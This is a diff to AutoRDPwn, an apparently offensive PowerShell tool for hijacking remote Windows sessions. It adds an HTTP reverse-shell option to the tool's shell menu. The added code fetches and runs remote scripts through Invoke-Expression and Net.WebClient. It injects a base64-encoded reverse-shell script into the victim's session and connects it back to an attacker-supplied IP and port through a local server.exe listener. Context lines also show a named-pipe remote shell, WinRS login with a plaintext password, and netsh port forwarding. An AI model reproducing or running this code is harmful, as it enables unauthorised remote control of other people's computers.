@@ -296,25 +296,31 @@ function Remove-Exclusions {
         $Host.UI.RawUI.ForegroundColor = 'Green' ; $module = $Host.UI.ReadLine()
 
         if($module -like '1') { Show-Banner
-        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "1" -NoNewLine -ForegroundColor Green ; Write-Host "] - $txt39" -ForegroundColor Gray
-        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "2" -NoNewLine -ForegroundColor Green ; Write-Host "] - Named Pipe Remote Shell (SMB)" -ForegroundColor Gray
-        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "3" -NoNewLine -ForegroundColor Green ; Write-Host "] - $txt51" -ForegroundColor Gray
-        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "4" -NoNewLine -ForegroundColor Green ; Write-Host "] - $txt52" -ForegroundColor Gray
+        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "1" -NoNewLine -ForegroundColor Green ; Write-Host "] - Named Pipe Remote Shell (SMB)" -ForegroundColor Gray
+        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "2" -NoNewLine -ForegroundColor Green ; Write-Host "] - $txt39" -ForegroundColor Gray
+        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "3" -NoNewLine -ForegroundColor Green ; Write-Host "] - PowerShell HTTP-RevShell (HTTP/S)" -ForegroundColor Gray
+        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "4" -NoNewLine -ForegroundColor Green ; Write-Host "] - $txt51" -ForegroundColor Gray
+        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "5" -NoNewLine -ForegroundColor Green ; Write-Host "] - $txt52" -ForegroundColor Gray
         Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "M" -NoNewLine -ForegroundColor Blue ; Write-Host "] - $txt22" -ForegroundColor Gray
         Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "X" -NoNewLine -ForegroundColor Red ; Write-Host "] - $txt2" -ForegroundColor Gray
         Write-Host ; Write-Host "[" -NoNewLine ; Write-Host "?" -NoNewLine -ForegroundColor Yellow ; Write-Host "] " -NoNewLine
         $Random = New-Object System.Random ; "$txt8" -split '' | ForEach-Object{Write-Host $_ -nonew ; Start-Sleep -milliseconds $(1 + $Random.Next(25))}
         $Host.UI.RawUI.ForegroundColor = 'Green' ; $shell = $Host.UI.ReadLine() ; Write-Host
 
-        if($shell -like '1'){$console = "true" ; Write-Host "[i] $txt21" -ForegroundColor Green ; Start-Sleep -milliseconds 2000 }
+        if($shell -like '1'){ $smbshell = "true" ; Write-Host "[i] $txt21" -ForegroundColor Green ; Start-Sleep -milliseconds 2000 }
 
-        if($shell -like '2'){$smbshell = "true" ; Write-Host "[i] $txt21" -ForegroundColor Green ; Start-Sleep -milliseconds 2000 }
-        
+        if($shell -like '2'){ $console = "true" ; Write-Host "[i] $txt21" -ForegroundColor Green ; Start-Sleep -milliseconds 2000 }
+
         if($shell -like '3'){ Write-Host "[i] $txt21" -ForegroundColor Green ; Start-Sleep -milliseconds 2000 ; Write-Host
+        & $question ; Write-Host "$txt54" -NoNewLine -ForegroundColor Gray ; $webrevip = $Host.UI.ReadLine() ; Write-Host
+        & $question ; Write-Host "$txt43" -NoNewLine -ForegroundColor Gray ; $webrevport = $Host.UI.ReadLine() ; Write-Host
+        Write-Host "[i] $txt46" -ForegroundColor Green ; $netcat = 'local' ; Start-Sleep -milliseconds 2000 ; $revshell = "true" }
+        
+        if($shell -like '4'){ Write-Host "[i] $txt21" -ForegroundColor Green ; Start-Sleep -milliseconds 2000 ; Write-Host
         & $question ; Write-Host "$txt53" -NoNewLine -ForegroundColor Gray ; $ncport = $Host.UI.ReadLine() ; Write-Host
         Write-Host "[i] $txt46" -ForegroundColor Green ; $netcat = 'local' ; Start-Sleep -milliseconds 2000 }
 
-        if($shell -like '4'){ Write-Host "[i] $txt21" -ForegroundColor Green ; Start-Sleep -milliseconds 2000 ; Write-Host
+        if($shell -like '5'){ Write-Host "[i] $txt21" -ForegroundColor Green ; Start-Sleep -milliseconds 2000 ; Write-Host
         & $question ; Write-Host "$txt43" -NoNewLine -ForegroundColor Gray ; $ncport = $Host.UI.ReadLine() ; Write-Host
         & $question ; Write-Host "$txt54" -NoNewLine -ForegroundColor Gray ; $ipadress = $Host.UI.ReadLine() ; Write-Host
         Write-Host "[i] $txt46" -ForegroundColor Green ; $netcat = 'remote' ; Start-Sleep -milliseconds 2000 }
@@ -683,6 +689,12 @@ try { while($true) { Get-Content -wait $env:localappdata\config.dat }} finally {
 
 if ($smbshell){ Write-Host ; if($local){ Import-Module .\Resources\Scripts\Invoke-PipeShell.ps1 } else { Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/Invoke-PipeShell.ps1')}
 Invoke-PipeShell -mode client -server $computer -aeskey AutoRDPwn_AESKey -i -pipe "NamedPipeStream" -timeout 120 }
+
+if ($revshell){ Write-Host ; Write-Host "[+] Downloading HTTP-RevShell Server.." -ForegroundColor Blue
+if($local){ Import-Module .\Resources\Scripts\Invoke-RevShellServer.ps1 } else { Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/Invoke-RevShellServer.ps1')}
+if($local){ Import-Module .\Resources\Scripts\Invoke-WebRev.ps1 } else { Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/Invoke-WebRev.ps1')}
+invoke-command -session $RDP[0] -scriptblock { $webrevscript = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("$using:webrev64")) ; Set-Content -Value $webrevscript -Path Invoke-WebRev.ps1 ; Import-Module .\Invoke-WebRev.ps1 ; Invoke-WebRev -ip $using:webrevip -port $using:webrevport }
+try { Clear-Host ; .\server.exe $webrevip $webrevport ; del .\server.exe } finally { Write-Host ; Write-Host "[!] Ctrl+C pressed, exiting.." -ForegroundColor Red ; Start-Sleep -milliseconds 2000 ; del .\server.exe }}
 
 if ($remoteforward){ invoke-command -session $RDP[0] -scriptblock { netsh interface portproxy add v4tov4 listenport=$using:rlport listenaddress=$using:rlhost connectport=$using:rrport connectaddress=$using:rrhost }}
 if ($console){ $PlainTextPassword = ConvertFrom-SecureToPlain $password ; Clear-Host ; Write-Host ">> $txt39 <<" ; Write-Host ; WinRS -r:$computer -u:$user -p:$PlainTextPassword "cmd" }}
